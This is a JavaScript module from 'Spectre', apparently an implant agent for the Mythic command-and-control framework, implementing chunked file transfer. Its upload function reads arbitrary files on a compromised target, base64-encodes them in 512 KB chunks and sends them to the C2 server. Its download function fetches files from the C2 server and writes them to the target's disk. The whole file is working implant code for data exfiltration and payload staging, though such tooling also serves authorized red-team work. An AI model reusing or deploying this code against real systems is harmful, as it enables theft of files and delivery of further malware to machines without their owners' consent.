// ============================================================
// Spectre - File Transfer Commands
// Upload (target -> Mythic) and Download (Mythic -> target)
// Chunked transfer with Mythic file API
// ============================================================

const TransferHandler = {
    CHUNK_SIZE: 512 * 1024, // 512 KB chunks

    /**
     * Upload a file from the target to Mythic.
     * Reads file, chunks it, sends each chunk via C2.
     */
    upload: async function(params) {
        const fs = require('fs');
        const path = require('path');

        try {
            const filePath = path.resolve(
                FilesystemHandler._cwd || process.cwd(),
                params.path || params.file
            );

            if (!fs.existsSync(filePath)) {
                return {
                    user_output: 'File not found: ' + filePath,
                    completed: true,
                    status: 'error',
                };
            }

            const stats = fs.statSync(filePath);
            const fileData = fs.readFileSync(filePath);
            const totalChunks = Math.ceil(fileData.length / TransferHandler.CHUNK_SIZE);

            // Register file with Mythic (first chunk)
            let fileId = '';

            for (let chunkNum = 1; chunkNum <= totalChunks; chunkNum++) {
                const start = (chunkNum - 1) * TransferHandler.CHUNK_SIZE;
                const end = Math.min(start + TransferHandler.CHUNK_SIZE, fileData.length);
                const chunk = fileData.slice(start, end);

                const response = await SpectreHTTP.postUpload({
                    chunk_num: chunkNum,
                    chunk_data: chunk.toString('base64'),
                    file_id: fileId,
                    full_path: filePath,
                    task_id: params.task_id,
                    total_chunks: totalChunks,
                    is_screenshot: false,
                });

                if (response.file_id) {
                    fileId = response.file_id;
                }
            }

            return {
                user_output: 'Uploaded: ' + filePath + ' (' + stats.size + ' bytes, ' + totalChunks + ' chunks)',
                completed: true,
                status: 'success',
                file_id: fileId,
            };
        } catch (err) {
            return {
                user_output: 'Upload error: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    },

    /**
     * Download a file from Mythic to the target.
     * Receives chunks from Mythic, reassembles, writes to disk.
     */
    download: async function(params) {
        const fs = require('fs');
        const path = require('path');

        try {
            const filePath = path.resolve(
                FilesystemHandler._cwd || process.cwd(),
                params.path || params.file
            );

            const fileId = params.file_id;
            if (!fileId) {
                return {
                    user_output: 'No file_id provided for download',
                    completed: true,
                    status: 'error',
                };
            }

            // Request file chunks from Mythic
            const chunks = [];
            let chunkNum = 1;
            let moreChunks = true;

            while (moreChunks) {
                const response = await SpectreHTTP.postUpload({
                    action: 'download',
                    chunk_num: chunkNum,
                    file_id: fileId,
                    task_id: params.task_id,
                    full_path: filePath,
                });

                if (response.chunk_data) {
                    chunks.push(Buffer.from(response.chunk_data, 'base64'));
                    chunkNum++;
                }

                if (response.total_chunks && chunkNum > response.total_chunks) {
                    moreChunks = false;
                }
                if (!response.chunk_data) {
                    moreChunks = false;
                }
            }

            // Reassemble and write
            const fileData = Buffer.concat(chunks);
            fs.writeFileSync(filePath, fileData);

            return {
                user_output: 'Downloaded: ' + filePath + ' (' + fileData.length + ' bytes)',
                completed: true,
                status: 'success',
            };
        } catch (err) {
            return {
                user_output: 'Download error: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    }
};
